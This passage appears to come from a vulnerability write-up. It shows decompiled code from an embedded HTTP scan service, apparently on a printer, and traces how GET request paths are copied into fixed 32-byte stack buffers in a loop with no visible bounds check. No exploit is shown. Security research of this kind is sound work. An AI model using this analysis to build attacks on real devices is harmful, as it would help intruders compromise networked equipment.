class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completeRequestHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2500&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpmgr_recvData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completeRequestHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dword_65260&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dword_65260&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;dword_594F0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_handle_get_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ----- [1]&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;default:&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the request method is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt;, it will use  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rest_scan_handle_get_request&lt;/code&gt; at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; to handle it. It also passes the pathinfo to this function.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rest_scan_handle_get_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// t1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r7&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r8&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+8h] [bp-D8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;second_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+28h] [bp-B8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+48h] [bp-98h] BYREF&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Scan/UserReadyToScan&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Scan/Jobs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xAu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_37:&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_DEBUG_syslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REST_SCAN_DEBUG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x411FA215&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//------------------------------------------------------ [2]  &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
